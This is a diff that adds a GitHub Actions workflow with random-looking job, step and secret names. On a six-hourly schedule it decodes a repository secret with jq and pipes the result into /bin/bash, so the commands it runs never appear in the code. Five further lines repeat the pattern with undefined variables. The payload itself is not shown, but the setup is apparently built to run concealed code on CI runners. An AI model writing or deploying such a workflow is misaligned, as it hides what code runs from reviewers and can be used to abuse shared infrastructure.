@@ -1,0 +1,23 @@
+name: xuliangqing7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuliangqing7654
+        env:
+          qmm79357: ${{ secrets.qmm79357 }}
+        run: |
+          echo $qmm79357 | jq -r .yyxda10 | /bin/bash
+          echo $kh634 | jq -r .mieun1 | /bin/bash
+          echo $vx0 | jq -r .lohn98517 | /bin/bash
+          echo $uvod9794 | jq -r .os44 | /bin/bash
+          echo $ukuuj6 | jq -r .kpe31 | /bin/bash
+          echo $c4 | jq -r .te1 | /bin/bash
+
